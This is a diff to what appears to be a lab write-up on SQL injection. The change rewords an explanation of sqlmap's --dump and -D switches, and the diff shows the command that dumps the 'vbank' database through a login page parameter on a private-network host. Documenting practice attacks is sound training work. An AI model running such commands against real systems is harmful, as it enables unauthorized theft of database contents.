@@ -117,7 +117,7 @@ __Result:__
 ![sqlmap_dbs](../task3/images/sqlmap_dbs.PNG)
 
 - Found `vbank` database (along with others)
-- use `vbank` as switch and dump the contents
+- use `--dump` as switch and dump the contents of database `vbank` with `-D` switch
 ```bash
 $ sqlmap -u 'http://192.168.37.128/login.php?username=alex' -D vbank --dump
         ___
